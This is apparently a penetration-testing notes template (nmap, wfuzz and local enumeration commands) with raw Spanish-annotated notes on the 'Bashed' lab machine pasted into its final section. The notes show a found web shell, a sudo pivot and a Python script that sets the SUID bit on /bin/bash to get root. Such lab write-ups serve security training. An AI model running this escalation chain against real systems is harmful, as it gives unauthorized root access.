<font color="green">=======================================================================</font>
# Initial Information<font color="red">:</font> 
<font color="blue">=======================================================================</font>

Name | IP Address | Tech Stack | Web Server | DB
-- | -- | -- | -- | --
-- | -- | -- | -- | --


<hr>

### Loot - Credentials<font color="red">:</font> 

**User** | **Password** | **System**
-- | -- | --
-- | -- | --

<hr>

<font color="green">=======================================================================</font>
# Enumeration
<font color="green">=======================================================================</font>

##### <font color="red">[+]</font> SERVICES<font color="red">:</font> 
- HTTP - <font color="red">XX</font> 

##### <font color="red">[+]</font> NMAP<font color="red">:</font> 

List all ports.
```bash
sudo nmap $IP -p- -sS --min-rate 5000 -Pn -n -v

PORT   STATE SERVICE
```

Services and version on identified open ports.
```bash 
nmap $IP -p XXX -sCV -oN enum/nmap -v

PORT   STATE SERVICE VERSION
```


<hr>

##### <font color="red">[+]</font> WFUZZ

###### FILES: <font color="red">/</font>(Web Root)
```bash
wfuzz -c --hc 404 --hh 0 -u http://$IP/FUZZ  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 200

# Results:
=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================
```

###### DIRECTORIES: <font color="red">/</font>(Web Root)
```bash
wfuzz -c --hc 404 --hh 0 -u http://$IP/FUZZ/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 200

Results:
=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================
```

<hr>

<font color="green">=======================================================================</font>
# Post Exploitation
<font color="green">=======================================================================</font>

##### <font color="red">[+]</font> PrivEsc Notes<font color="red">:</font> 


##### <font color="red">[+]</font> System Enumeration<font color="red">:</font> 

- **Host**:
- **Compilation version and architecture**:


##### <font color="red">[+]</font> List Interesting Directories<font color="red">:</font> 

- **/tmp**:
- **/opt**:
- **/var/tmp**:
- **/dev/shm**:
- **/var/backups/**:
- **/var/mail**:

##### <font color="red">[+]</font> S/GUIDS<font color="red">:</font> 

- SUIDs:
```bash
find / -perm -u=s -type f 2>/dev/null
```

##### <font color="red">[+]</font> ROOT Processes (ps) <font color="red">:</font> 
```bash
ps aux | grep -i root --color
```

##### <font color="red">[+]</font> Local Network Services (netstat/ss)<font color="red">:</font> 
```bash
# (or ss if netstat not available)
netstat -tunlp | grep '127.0.0.1' --color=auto
netstat -antup | grep '127.0.0.1' --color=auto
```

##### <font color="red">[+]</font> I/O - PsPy<font color="red">:</font> 
```bash
```PORT   STATE SERVICE
80/tcp open  http
nmap 10.10.10.68 --script http-enum -p80 -oN webscan
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /uploads/: Potentially interesting folder
http://10.10.10.68/dev/phpbash.php
sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
❯ vemos que script mananer NOPASSWD
❯ entones podemos ejecutar comandos como el
sudo -u scriptmanager bash
sudo -u scriptmanager bash
scriptmanager@bashed:/home/arrexel$ whoami
scriptmanager
lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.2 LTS
Release:	16.04
 find / -perm -4000 2>/dev/null
pwd
/scripts
nano shell.py
scriptmanager@bashed:/scripts$ cat shell.py
import os
os.system("chmod u+s /bin/bash")
nano shelly.py
scriptmanager@bashed:/scripts$ cat shelly.py
#!/usr/bin/python3

import socket
❯ no estoy seguro si es shell.py o shelly.py, se compartan de manera rara: pero funciona al cambiar la /bash/ los permisos.
❯ si ejecuto newprocess script puedo ver lo que se ejecuta:
 bash -p
bash-4.3# whoami
root
❯ bash -p hace que la bash me asigne los permisos que tenga, en esta caso se cambiaron con el script python y me dio root porque cambie los permisos
